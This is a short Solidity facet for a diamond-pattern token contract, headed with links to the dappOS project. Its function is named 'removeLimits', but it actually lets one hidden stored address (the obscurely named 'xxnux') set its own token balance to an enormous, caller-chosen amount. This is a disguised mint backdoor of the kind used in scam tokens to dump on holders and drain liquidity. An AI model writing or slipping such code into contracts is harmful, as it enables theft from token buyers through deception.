/*
 * SPDX-License-Identifier: MIT
 * Website: https://dappos.com/
 * X: https://twitter.com/dappos_com
 * Telegram: https://t.me/DapposOfficial
 * Discord: https://discord.com/invite/sEtcYb9FgT
 */

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                4206900000 *
                42000 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
